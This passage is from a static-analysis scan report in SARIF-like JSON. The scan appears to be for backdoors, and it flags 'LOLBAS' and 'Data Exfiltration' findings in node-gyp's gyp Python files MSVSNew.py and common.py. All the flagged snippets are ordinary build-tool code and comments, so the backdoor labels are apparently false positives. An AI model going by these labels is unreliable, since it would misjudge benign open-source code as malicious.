                      "text": "        sln_root = os.path.split(self.path)[0]\n        for e in all_entries:\n            relative_path = gyp.common.RelativePath(e.path, sln_root)\n            # msbuild does not accept an empty folder_name.\n            # use '.' in case relative_path is empty.\n            folder_name = relative_path.replace(\"/\", \"\\\\\") or \".\"\n            f.write(\n",
                      "markdown": "`        sln_root = os.path.split(self.path)[0]\n        for e in all_entries:\n            relative_path = gyp.common.RelativePath(e.path, sln_root)\n            # msbuild does not accept an empty folder_name.\n            # use '.' in case relative_path is empty.\n            folder_name = relative_path.replace(\"/\", \"\\\\\") or \".\"\n            f.write(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSNew.py"
                },
                "region": {
                  "startLine": 311,
                  "startColumn": 9,
                  "endLine": 311,
                  "endColumn": 15,
                  "snippet": {
                    "text": "            f.write(f\"\\t\\t{v} = {v}\\r\\n\")\n        f.write(\"\\tEndGlobalSection\\r\\n\")\n\n        # Sort config guids for easier diffing of solution changes.\n        config_guids = []\n        config_guids_overrides = {}\n        for e in all_entries:\n",
                    "rendered": {
                      "text": "            f.write(f\"\\t\\t{v} = {v}\\r\\n\")\n        f.write(\"\\tEndGlobalSection\\r\\n\")\n\n        # Sort config guids for easier diffing of solution changes.\n        config_guids = []\n        config_guids_overrides = {}\n        for e in all_entries:\n",
                      "markdown": "`            f.write(f\"\\t\\t{v} = {v}\\r\\n\")\n        f.write(\"\\tEndGlobalSection\\r\\n\")\n\n        # Sort config guids for easier diffing of solution changes.\n        config_guids = []\n        config_guids_overrides = {}\n        for e in all_entries:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSNew.py"
                },
                "region": {
                  "startLine": 176,
                  "startColumn": 51,
                  "endLine": 176,
                  "endColumn": 57,
                  "snippet": {
                    "text": "            # 2. The path needs to be relative to $SOURCE_ROOT, so that the project\n            #    GUID is the same whether it's included from base/base.sln or\n            #    foo/bar/baz/baz.sln.\n            # 3. The GUID needs to be the same each time this builder is invoked, so\n            #    that we don't need to rebuild the solution when the project changes.\n            # 4. We should be able to handle pre-built project files by reading the\n            #    GUID from the files.\n",
                    "rendered": {
                      "text": "            # 2. The path needs to be relative to $SOURCE_ROOT, so that the project\n            #    GUID is the same whether it's included from base/base.sln or\n            #    foo/bar/baz/baz.sln.\n            # 3. The GUID needs to be the same each time this builder is invoked, so\n            #    that we don't need to rebuild the solution when the project changes.\n            # 4. We should be able to handle pre-built project files by reading the\n            #    GUID from the files.\n",
                      "markdown": "`            # 2. The path needs to be relative to $SOURCE_ROOT, so that the project\n            #    GUID is the same whether it's included from base/base.sln or\n            #    foo/bar/baz/baz.sln.\n            # 3. The GUID needs to be the same each time this builder is invoked, so\n            #    that we don't need to rebuild the solution when the project changes.\n            # 4. We should be able to handle pre-built project files by reading the\n            #    GUID from the files.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSNew.py"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 9,
                  "endLine": 71,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\nclass MSVSSolutionEntry:\n    def __cmp__(self, other):\n        # Sort by name then guid (so things are in order on vs2008).\n        return cmp((self.name, self.get_guid()), (other.name, other.get_guid()))\n\n\n",
                    "rendered": {
                      "text": "\nclass MSVSSolutionEntry:\n    def __cmp__(self, other):\n        # Sort by name then guid (so things are in order on vs2008).\n        return cmp((self.name, self.get_guid()), (other.name, other.get_guid()))\n\n\n",
                      "markdown": "`\nclass MSVSSolutionEntry:\n    def __cmp__(self, other):\n        # Sort by name then guid (so things are in order on vs2008).\n        return cmp((self.name, self.get_guid()), (other.name, other.get_guid()))\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSNew.py"
                },
                "region": {
                  "startLine": 323,
                  "startColumn": 46,
                  "endLine": 323,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        f.write(\"\\tGlobalSection(ProjectConfigurationPlatforms) = postSolution\\r\\n\")\n        for g in config_guids:\n            for v in self.variants:\n                nv = config_guids_overrides[g].get(v, v)\n                # Pick which project configuration to build for this solution\n                # configuration.\n                f.write(\n",
                    "rendered": {
                      "text": "        f.write(\"\\tGlobalSection(ProjectConfigurationPlatforms) = postSolution\\r\\n\")\n        for g in config_guids:\n            for v in self.variants:\n                nv = config_guids_overrides[g].get(v, v)\n                # Pick which project configuration to build for this solution\n                # configuration.\n                f.write(\n",
                      "markdown": "`        f.write(\"\\tGlobalSection(ProjectConfigurationPlatforms) = postSolution\\r\\n\")\n        for g in config_guids:\n            for v in self.variants:\n                nv = config_guids_overrides[g].get(v, v)\n                # Pick which project configuration to build for this solution\n                # configuration.\n                f.write(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 442,
                  "startColumn": 11,
                  "endLine": 442,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n    else:\n        return {}\n\n",
                    "rendered": {
                      "text": "    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n    else:\n        return {}\n\n",
                      "markdown": "`    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n    else:\n        return {}\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 440,
                  "startColumn": 7,
                  "endLine": 440,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n    else:\n",
                    "rendered": {
                      "text": "        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n    else:\n",
                      "markdown": "`        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n            cmd += shlex.split(replace_sep(CXXFLAGS))\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 438,
                  "startColumn": 11,
                  "endLine": 438,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n",
                    "rendered": {
                      "text": "    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n",
                      "markdown": "`    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n        cmd += shlex.split(replace_sep(CXX))\n        if CXXFLAGS := os.environ.get(\"CXXFLAGS\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 436,
                  "startColumn": 7,
                  "endLine": 436,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        return s.replace(os.sep, \"/\") if os.sep != \"/\" else s\n\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n",
                    "rendered": {
                      "text": "        return s.replace(os.sep, \"/\") if os.sep != \"/\" else s\n\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n",
                      "markdown": "`        return s.replace(os.sep, \"/\") if os.sep != \"/\" else s\n\n    if CC := os.environ.get(\"CC_target\") or os.environ.get(\"CC\"):\n        cmd += shlex.split(replace_sep(CC))\n        if CFLAGS := os.environ.get(\"CFLAGS\"):\n            cmd += shlex.split(replace_sep(CFLAGS))\n    elif CXX := os.environ.get(\"CXX_target\") or os.environ.get(\"CXX\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 427,
                  "startColumn": 3,
                  "endLine": 427,
                  "endColumn": 8,
                  "snippet": {
                    "text": "        pass\n\ndef GetCrossCompilerPredefines():  # -> dict\n    cmd = []\n\n    # shlex.split() will eat '\\' in posix mode, but\n    # setting posix=False will preserve extra '\"' cause CreateProcess fail on Windows\n",
                    "rendered": {
                      "text": "        pass\n\ndef GetCrossCompilerPredefines():  # -> dict\n    cmd = []\n\n    # shlex.split() will eat '\\' in posix mode, but\n    # setting posix=False will preserve extra '\"' cause CreateProcess fail on Windows\n",
                      "markdown": "`        pass\n\ndef GetCrossCompilerPredefines():  # -> dict\n    cmd = []\n\n    # shlex.split() will eat '\\' in posix mode, but\n    # setting posix=False will preserve extra '\"' cause CreateProcess fail on Windows\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 256,
                  "startColumn": 54,
                  "endLine": 256,
                  "endColumn": 60,
                  "snippet": {
                    "text": "# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n# the backslash), which would not be correct for argument encoding.  Handling\n# this case properly would also be problematic because bash allows the history\n# character to be changed with the histchars shell variable.  Fortunately,\n# as history is not enabled in non-interactive shells and\n# EncodePOSIXShellArgument is only expected to encode for non-interactive\n",
                    "rendered": {
                      "text": "# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n# the backslash), which would not be correct for argument encoding.  Handling\n# this case properly would also be problematic because bash allows the history\n# character to be changed with the histchars shell variable.  Fortunately,\n# as history is not enabled in non-interactive shells and\n# EncodePOSIXShellArgument is only expected to encode for non-interactive\n",
                      "markdown": "`# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n# the backslash), which would not be correct for argument encoding.  Handling\n# this case properly would also be problematic because bash allows the history\n# character to be changed with the histchars shell variable.  Fortunately,\n# as history is not enabled in non-interactive shells and\n# EncodePOSIXShellArgument is only expected to encode for non-interactive\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 253,
                  "startColumn": 38,
                  "endLine": 253,
                  "endColumn": 44,
                  "snippet": {
                    "text": "# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n# the backslash), which would not be correct for argument encoding.  Handling\n# this case properly would also be problematic because bash allows the history\n",
                    "rendered": {
                      "text": "# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n# the backslash), which would not be correct for argument encoding.  Handling\n# this case properly would also be problematic because bash allows the history\n",
                      "markdown": "`# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n# the backslash), which would not be correct for argument encoding.  Handling\n# this case properly would also be problematic because bash allows the history\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 251,
                  "startColumn": 47,
                  "endLine": 251,
                  "endColumn": 53,
                  "snippet": {
                    "text": "# EncodePOSIXShellArgument is to permit parameter (variable) expansion.\n#\n# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n",
                    "rendered": {
                      "text": "# EncodePOSIXShellArgument is to permit parameter (variable) expansion.\n#\n# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n",
                      "markdown": "`# EncodePOSIXShellArgument is to permit parameter (variable) expansion.\n#\n# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 250,
                  "startColumn": 41,
                  "endLine": 250,
                  "endColumn": 47,
                  "snippet": {
                    "text": "# Missing from this list is $, because the desired behavior of\n# EncodePOSIXShellArgument is to permit parameter (variable) expansion.\n#\n# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n",
                    "rendered": {
                      "text": "# Missing from this list is $, because the desired behavior of\n# EncodePOSIXShellArgument is to permit parameter (variable) expansion.\n#\n# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n",
                      "markdown": "`# Missing from this list is $, because the desired behavior of\n# EncodePOSIXShellArgument is to permit parameter (variable) expansion.\n#\n# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 220,
                  "startColumn": 22,
                  "endLine": 221,
                  "snippet": {
                    "text": "#   #              comments\n#   $              expansions (quoted to always expand within one argument)\n#   %              called out by IEEE 1003.1 XCU.2.2\n#   &              job control\n#   '              quoting\n#   (, )           subshell execution\n#   *, ?, [        pathname expansion\n#   ;              command delimiter\n",
                    "rendered": {
                      "text": "#   #              comments\n#   $              expansions (quoted to always expand within one argument)\n#   %              called out by IEEE 1003.1 XCU.2.2\n#   &              job control\n#   '              quoting\n#   (, )           subshell execution\n#   *, ?, [        pathname expansion\n#   ;              command delimiter\n",
                      "markdown": "`#   #              comments\n#   $              expansions (quoted to always expand within one argument)\n#   %              called out by IEEE 1003.1 XCU.2.2\n#   &              job control\n#   '              quoting\n#   (, )           subshell execution\n#   *, ?, [        pathname expansion\n#   ;              command delimiter\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 218,
                  "startColumn": 47,
                  "endLine": 218,
                  "endColumn": 55,
                  "snippet": {
                    "text": "# characters appearing anywhere in an argument:\n#   \\t, \\n, space  parameter separators\n#   #              comments\n#   $              expansions (quoted to always expand within one argument)\n#   %              called out by IEEE 1003.1 XCU.2.2\n#   &              job control\n#   '              quoting\n",
                    "rendered": {
                      "text": "# characters appearing anywhere in an argument:\n#   \\t, \\n, space  parameter separators\n#   #              comments\n#   $              expansions (quoted to always expand within one argument)\n#   %              called out by IEEE 1003.1 XCU.2.2\n#   &              job control\n#   '              quoting\n",
                      "markdown": "`# characters appearing anywhere in an argument:\n#   \\t, \\n, space  parameter separators\n#   #              comments\n#   $              expansions (quoted to always expand within one argument)\n#   %              called out by IEEE 1003.1 XCU.2.2\n#   &              job control\n#   '              quoting\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 209,
                  "startColumn": 71,
                  "endLine": 210,
                  "snippet": {
                    "text": "    return os.path.normpath(os.path.join(rel_dir, path))\n\n\n# re objects used by EncodePOSIXShellArgument.  See IEEE 1003.1 XCU.2.2 at\n# http://www.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html#tag_02_02\n# and the documentation for various shells.\n\n# _quote is a pattern that should match any argument that needs to be quoted\n",
                    "rendered": {
                      "text": "    return os.path.normpath(os.path.join(rel_dir, path))\n\n\n# re objects used by EncodePOSIXShellArgument.  See IEEE 1003.1 XCU.2.2 at\n# http://www.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html#tag_02_02\n# and the documentation for various shells.\n\n# _quote is a pattern that should match any argument that needs to be quoted\n",
                      "markdown": "`    return os.path.normpath(os.path.join(rel_dir, path))\n\n\n# re objects used by EncodePOSIXShellArgument.  See IEEE 1003.1 XCU.2.2 at\n# http://www.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html#tag_02_02\n# and the documentation for various shells.\n\n# _quote is a pattern that should match any argument that needs to be quoted\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 684,
                  "startColumn": 7,
                  "endLine": 684,
                  "endColumn": 13,
                  "snippet": {
                    "text": "        visiting.remove(node)\n        ordered_nodes.insert(0, node)\n\n    for node in sorted(graph):\n        Visit(node)\n    return ordered_nodes\n\n",
                    "rendered": {
                      "text": "        visiting.remove(node)\n        ordered_nodes.insert(0, node)\n\n    for node in sorted(graph):\n        Visit(node)\n    return ordered_nodes\n\n",
                      "markdown": "`        visiting.remove(node)\n        ordered_nodes.insert(0, node)\n\n    for node in sorted(graph):\n        Visit(node)\n    return ordered_nodes\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 675,
                  "startColumn": 10,
                  "endLine": 675,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    def Visit(node):\n        if node in visiting:\n            raise CycleError(visiting)\n        if node in visited:\n            return\n        visited.add(node)\n        visiting.add(node)\n",
                    "rendered": {
                      "text": "    def Visit(node):\n        if node in visiting:\n            raise CycleError(visiting)\n        if node in visited:\n            return\n        visited.add(node)\n        visiting.add(node)\n",
                      "markdown": "`    def Visit(node):\n        if node in visiting:\n            raise CycleError(visiting)\n        if node in visited:\n            return\n        visited.add(node)\n        visiting.add(node)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 673,
                  "startColumn": 10,
                  "endLine": 673,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    ordered_nodes = []\n\n    def Visit(node):\n        if node in visiting:\n            raise CycleError(visiting)\n        if node in visited:\n            return\n",
                    "rendered": {
                      "text": "    ordered_nodes = []\n\n    def Visit(node):\n        if node in visiting:\n            raise CycleError(visiting)\n        if node in visited:\n            return\n",
                      "markdown": "`    ordered_nodes = []\n\n    def Visit(node):\n        if node in visiting:\n            raise CycleError(visiting)\n        if node in visited:\n            return\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 655,
                  "startColumn": 54,
                  "endLine": 655,
                  "endColumn": 60,
                  "snippet": {
                    "text": "               of node names which this node has outgoing edges to.\n  Returns:\n    A list containing all of the node in graph in topological order.\n    It is assumed that calling get_edges once for each node and caching is\n    cheaper than repeatedly calling get_edges.\n  Raises:\n    CycleError in the event of a cycle.\n",
                    "rendered": {
                      "text": "               of node names which this node has outgoing edges to.\n  Returns:\n    A list containing all of the node in graph in topological order.\n    It is assumed that calling get_edges once for each node and caching is\n    cheaper than repeatedly calling get_edges.\n  Raises:\n    CycleError in the event of a cycle.\n",
                      "markdown": "`               of node names which this node has outgoing edges to.\n  Returns:\n    A list containing all of the node in graph in topological order.\n    It is assumed that calling get_edges once for each node and caching is\n    cheaper than repeatedly calling get_edges.\n  Raises:\n    CycleError in the event of a cycle.\n`"
                    }
                  },
